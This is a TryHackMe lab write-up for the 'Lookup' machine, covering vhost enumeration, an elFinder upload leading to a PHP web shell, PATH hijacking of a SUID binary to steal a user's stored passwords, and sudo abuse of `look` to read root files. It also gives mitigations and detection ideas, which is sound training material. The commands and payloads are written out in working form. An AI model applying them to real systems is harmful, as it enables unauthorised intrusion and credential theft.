# Lookup Report (TryHackMe)

> Date: 2026-01-24
> 
> 
> **Target:** `TARGET_MACHINE`
> 
> **Difficulty:** Easy
> 
> **Status:** 🟢 Completed
> 

---

## 📑 Executive Summary

The **Lookup** environment was successfully compromised through a multi-stage attack chain involving **virtual host enumeration, remote command execution, credential harvesting, and Linux privilege escalation**.

The compromise began with **subdomain discovery**, leading to an exposed **elFinder file manager** that enabled **Remote Code Execution (RCE)**. Post-exploitation enumeration revealed a vulnerable **SUID binary (`pwm`)**, which allowed credential extraction and lateral movement to the user **think**. Final escalation to **root** was achieved via a **sudo misconfiguration** involving the `look` binary.

This lab effectively demonstrates **full attack lifecycle execution**, emphasizing systematic reconnaissance, exploitation chaining, privilege escalation, and SOC detection opportunities.

---

## 🛡️ Scope & Rules

- **Environment:** TryHackMe Controlled Lab
- **Authorization:** Explicit permission granted
- **Objective:** Skill development & ethical security research
- **Restrictions:** No unauthorized systems accessed

---

## 🗺️ Attack Path Overview

| Phase | Description |
| --- | --- |
| Recon | Port scanning, vhost enumeration |
| Initial Access | elFinder → PHP RCE |
| Stabilization | TTY upgrade |
| Lateral Movement | pwm exploit → `think` credentials |
| Privilege Escalation | sudo misconfiguration → root |

---

## 🔍 Recon & Enumeration

### 1️⃣ Service Discovery

An initial TCP scan revealed:

```bash
nmap -sC -sV -p- lookup.thm
```

**Findings:**

- 22/tcp — SSH
- 80/tcp — HTTP

---

### **2️⃣ Virtual Host Enumeration**

Using **ffuf**, virtual host fuzzing revealed an exposed internal file manager.

```bash
ffuf -u http://lookup.thm -H "Host: FUZZ.lookup.thm" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Discovered Subdomain:**

```bash
files.lookup.thm
```

This subdomain hosted an exposed **elFinder file management interface**.

> Why this mattered: Internal admin tools frequently lack authentication and contain high-impact vulnerabilities.
> 

---

## **🚀 Exploitation**

### **1️⃣ elFinder Remote Code Execution**

The elFinder utility allowed **image rotation and rename operations**. By manipulating these functions, a PHP payload was uploaded and executed.

**Attack Steps:**

- Upload image file
- Intercept rename request
- Change extension to .php
- Inject PHP reverse shell payload
- Trigger execution

**Reverse Shell Payload:**

```php
<?php system($_GET['cmd']); ?>
```

**Shell Trigger:**

```php
nc -lvnp 4444
```

**Result:**

```php
www-data shell obtained
```

**2️⃣ TTY Stabilization**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl + Z
stty raw -echo; fg
reset
```

This enabled stable shell interaction for privilege escalation workflows.

## **📈 Privilege Escalation**

### **1️⃣ Lateral Movement:**

### **www-data ➝ think**

During system enumeration, a custom **SUID binary** named pwm was discovered.

```bash
find / -perm -4000 2>/dev/null
```

**Key Binary:**

```bash
/usr/sbin/pwm
```

### **Binary Analysis**

Static inspection revealed the binary:

- Executes the id command
- Attempts to read:

```bash
/home/<username>/.passwords
```

Because the binary did **not use absolute paths**, it was vulnerable to **PATH hijacking**.

### **Exploitation**

A malicious id script was created:

```bash
cd /tmp
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > id
chmod +x id
export PATH=/tmp:$PATH
```

Running the vulnerable binary:

```bash
/usr/sbin/pwm
```

**Result:**

```bash
/home/think/.passwords
```

The .passwords file contained multiple candidate credentials. One successfully authenticated as:

```bash
think
```

**Why it worked:** The SUID binary trusted system command execution without absolute path validation — a classic privilege abuse vulnerability.

---

### **2️⃣ Vertical Escalation:**

### **think ➝ root**

A sudo privilege audit revealed:

```bash
sudo -l
```

**Finding:**

```bash
(root) NOPASSWD: /usr/bin/look
```

he look binary allows **file content reading**. When executed with root privileges, it enables arbitrary file access.

### **Root Flag Access:**

```bash
sudo /usr/bin/look "" /root/root.txt
```

**Result:**

```bash
ROOT FLAG OBTAINED
```

**Why it worked:** File-reading utilities should never be permitted under unrestricted sudo privileges.

---

## **🏁 Flags**

| **Privilege** | **Location** |
| --- | --- |
| User | /home/think/user.txt |
| Root | /root/root.txt |

---

**🛠️ Tools Used**

| **Category** | **Tools** |
| --- | --- |
| Enumeration | Nmap, FFUF |
| Web Proxy | Burp Suite |
| Exploitation | Netcat, Python |
| Post-Exploitation | Linux native utilities |

---

**💡 Lessons Learned**

- Subdomain enumeration frequently reveals internal admin tooling.
- File upload utilities are high-risk attack surfaces.
- SUID binaries require strict auditing.
- PATH hijacking remains a critical Linux privilege escalation technique.
- sudo misconfigurations routinely lead to full system compromise.

---

**🛡️ Defensive Recommendations**

| **Vulnerability** | **Mitigation** |
| --- | --- |
| Exposed elFinder | Enforce authentication + access controls |
| File Upload RCE | Strict MIME validation + server-side renaming |
| Hardcoded secrets | Environment variables + vault storage |
| Vulnerable SUID binaries | Use absolute paths + reduce SUID footprint |
| Sudo misconfiguration | Strict command whitelisting |

---

## **🚨 SOC Detection Opportunities**

- Monitor abnormal HTTP file upload behaviors
- Detect PHP execution in upload directories
- Alert on Apache spawning shell processes
- Detect PATH manipulation activity
- Monitor sudo execution anomalies

---

**🗺️ MITRE ATT&CK Mapping**

| **Technique** | **ID** |
| --- | --- |
| Web Exploitation | T1190 |
| Command Execution | T1059 |
| Credential Discovery | T1552 |
| Privilege Escalation | T1068 |
| Defense Evasion | T1036 |

---

## **⚠️ Disclaimer**

This report is provided strictly for **educational and ethical cybersecurity research purposes**. All testing was conducted within a **controlled lab environment** with explicit authorization.

---
